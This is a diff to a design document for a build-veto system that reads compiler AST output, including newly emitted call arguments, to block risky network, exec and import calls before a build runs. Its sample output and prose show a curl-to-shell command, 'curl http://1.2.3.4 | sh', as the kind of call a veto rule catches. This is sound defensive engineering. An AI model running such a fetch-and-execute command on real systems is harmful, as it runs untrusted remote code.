@@ -145,11 +145,12 @@ is settled in favour of the AST (2b, shipped). Both options, for the record:
     and — when a rule is set — **net** (`tcp`/`http_*` family) and forbidden
     **imports**.
 
-  *Caveat on net (see "Known gap" below): 2b can today veto that a build
-  reaches the network, but not yet to **which host** — the emit doesn't carry
-  call arguments, so a host allowlist isn't expressible at this layer yet
-  (`../aether/veto-emit-ast-args.md` is the follow-up ask; layer 3 is the
-  host-level backstop meanwhile).*
+  *On net + arguments (see "Call arguments" below): the emit now carries
+  literal call arguments (`args[]`), so a literal coordinate/URL **is** readable
+  — the input a host/coordinate allowlist needs. `lib/veto` doesn't consume
+  `args[]` yet (it matches on `callee` today), but the wire data is there; a
+  computed argument fail-closes, and layer 3 remains the host-level backstop for
+  the computed case.*
 
   This is **Tier C's intent ("read what the build would do") realized via the
   compiler's own AST instead of a doppelganger** — stronger than Tier C (sees
@@ -254,14 +255,16 @@ rule would match the `import_statement` node; an `allow_import` allowlist uses
 the same `module` field (and `selected[]` to distinguish whole-module from
 single-name imports).
 
-**Other node fields** (from the v0.227.0 schema, not shown above):
-`extern_function` carries `"variadic": true` on varargs externs; an
-`import_statement` carries `"alias"` for `import X as Y` and `"glob": true`
-for `import X (*)`; a `function_call` with **no static target**
-(function-pointer dispatch) emits `"indirect": true` instead of `callee` —
-**`lib/veto` fail-closes on those** (no readable target ⇒ veto). A node whose
-`file` is **NULL** is compiler-synthesised; a deny-match on one is surfaced as
-`<unknown-origin>` rather than silently trusted or vetoed.
+**Other node fields** (elided from the three examples above for focus):
+every `function_call` also carries an **`args[]`** array — covered in its own
+subsection below (it's the post-v0.227.0 addition). Plus: `extern_function`
+carries `"variadic": true` on varargs externs; an `import_statement` carries
+`"alias"` for `import X as Y` and `"glob": true` for `import X (*)`; a
+`function_call` with **no static target** (function-pointer dispatch) emits
+`"indirect": true` instead of `callee` — **`lib/veto` fail-closes on those**
+(no readable target ⇒ veto). A node whose `file` is **NULL** is
+compiler-synthesised; a deny-match on one is surfaced as `<unknown-origin>`
+rather than silently trusted or vetoed.
 
 **Fail-closed exit:** a tree that doesn't typecheck emits **no AST** and
 `aetherc --emit=ast` exits non-zero — `lib/veto` treats that as a veto
@@ -274,39 +277,57 @@ $ echo $?
 1                                   # → lib/veto: VETO (veto:no-ast)
 ```
 
-#### Known gap: 2b reads the *call*, not its *arguments* (yet)
+#### Call arguments — now on the wire (the literal coordinate is readable)
 
-The emit carries the resolved `callee` but **not the call's arguments**. So a
-resolver verb surfaces as `callee: "maven_dep"` with **no coordinate**, and the
-rare literal `os.system("curl … | sh")` surfaces as `callee: "os_system"` with
-**no command string**.
+The emit now carries each `function_call`'s **arguments** (aether `[current]`,
+post-v0.227.0 — the `veto-emit-ast-args.md` follow-up, shipped). Every call
+node has an `args[]` array, one entry per positional/named arg in source order:
 
-What a `.build.ae` actually does shapes which gap matters: build files don't
-generally call `http.get(url)` directly — they call **purposeful verbs**
-(`maven.dep("org.foo:bar:1.2.3")`, `pnpm.install("foo@2")`, `cargo.fetch(...)`),
-and the real socket call lives deep inside those SDKs (`--lib`-origin, exempt)
-or in a shelled-out resolver (not even Aether AST). So:
+- `{"literal": "<value>"}` for a primitive literal (string/int/float/bool);
+- `{"computed": true}` for anything else (an identifier ref, an expression, a
+  nested call, an interpolation) — **no expression provenance**, just the
+  literal-vs-not flag, by design;
+- trailing closures / DSL builder bodies are filtered out (not args in the veto
+  sense); the array is always present (even empty), so the policy walker can
+  rely on `args` being a defined shape.
 
-- The high-value argument to read is the **literal coordinate handed to a
-  resolver verb** — the input to a banned/CVE dependency check (Tier B). 2b
-  sees the verb but not yet *which* coordinate.
-- This also shows why **origin scoping is load-bearing**: a single user
-  `http.get(...)` explodes into ~10 std-origin nodes from inside
-  `std/http/module.ae` (`http_get_raw` — the actual socket — `http_response_*`,
-  `string_concat`, …), all `--lib`-origin and **exempt**; only the user-file
-  verb node trips. Without origin scoping every resolver call would drag the
-  stdlib's internals into the verdict.
+Real output (installed binary):
 
-Filed upstream: `../aether/veto-emit-ast-args.md` asks for **literal arguments**
-on `function_call` nodes (plus emitting after const-fold). Coordinates are
-written, not computed, so the literal case is near-total coverage. The
-discipline: aeb **reads a literal coordinate** (banned/allowlist check, static,
-pre-build) and **vetoes any computed argument** to a resolver verb (a build
-that hands a resolver a non-literal coordinate can't be vouched for) — so the
-upstream ask needs only a literal-or-not flag, no expression provenance. The
-*actual* network reach of any resolver is **layer 3's** job — the `connect()`
-interceptor sees the resolved address regardless of how anything was built. So:
-2b reads literal coordinates pre-build; layer 3 backstops the sockets.
+```json
+{"kind":"function_call","file":"app.ae","line":4,"callee":"os_system",
+ "args":[{"literal":"curl http://1.2.3.4 | sh"}]}
+{"kind":"function_call","file":"app.ae","line":6,"callee":"os_system",
+ "args":[{"computed":true}]}                     // os.system(target) — a ref
+```
+
+What this unlocks, and the discipline that keeps it safe:
+
+- **The literal coordinate is now readable.** `maven.dep("org.foo:bar:1.2.3")`
+  surfaces `args:[{"literal":"org.foo:bar:1.2.3"}]` — the input a banned/CVE
+  dependency check (Tier B) wants. And the rare literal
+  `os.system("curl … | sh")` now surfaces its **command string**, so an exec
+  rule can read the `curl` target, not just "shells out."
+- **Coordinates are written, not computed** — and string-literal `+` concat
+  *isn't even valid Aether* (the parser rejects it), so the practical case is a
+  single string literal. The literal arm is therefore near-total coverage for
+  the verb-with-coordinate shape a real `.build.ae` uses.
+- **`{"computed":true}` ⇒ veto.** A build that hands a resolver verb (or an
+  exec/net call) a non-literal argument can't be vouched for statically, so aeb
+  **fail-closes** on it. The flag carries no contents to reason about — that's
+  intentional (it keeps `--emit=ast` from drifting into a taint analyzer); the
+  decision is the same regardless of what the expression was.
+
+Origin scoping is still load-bearing here: a single user `http.get(...)`
+explodes into ~10 std-origin nodes from inside `std/http/module.ae`
+(`http_get_raw` — the actual socket — `http_response_*`, `string_concat`, …),
+all `--lib`-origin and **exempt**; only the user-file verb node trips. And the
+layered division holds: **2b reads the literal argument pre-build; layer 3's
+`connect()`/`execve()` interceptors backstop the *computed* case at the syscall**,
+seeing the resolved value regardless of how it was built.
+
+*(Still pending in `lib/veto`: actually consuming `args[]` — the slice today
+matches on `callee` only. Reading the literal coordinate is the next increment;
+the wire data is now there for it.)*
 
 ### Layer 3 — runtime containment (the part the source set can't override)
 
@@ -755,8 +776,11 @@ maybe_veto_build(repo, target, purpose):
    vetoes `extern syscall`, clears clean code). **Default policy:** deny all
    externs *except a known-safe runtime allowlist* (`println` etc. — the live
    smoke caught that a blanket deny false-positives on every ordinary program)
-   + deny exec. **Next:** the `.veto.ae` policy-DSL front end lowers onto these
-   rules. (Stopgap 2a — `.c` grep — no longer needed.)
+   + deny exec. **Next:** (a) consume the now-emitted `args[]` so a rule can read
+   the literal coordinate/command (the `veto-emit-ast-args.md` follow-up shipped
+   in aether `[current]` — args are on the wire, `lib/veto` matches `callee`
+   only so far); (b) the `.veto.ae` policy-DSL front end lowers onto these rules.
+   (Stopgap 2a — `.c` grep — no longer needed.)
 5. **Tier C spike** — the `--lib` doppelganger that records build intent
    (`os.system`/`dep`/`link_flag`/codegen) instead of executing; the aeb-unique
    route to "read the build's intent" with no aether change. Parallel to 2b.
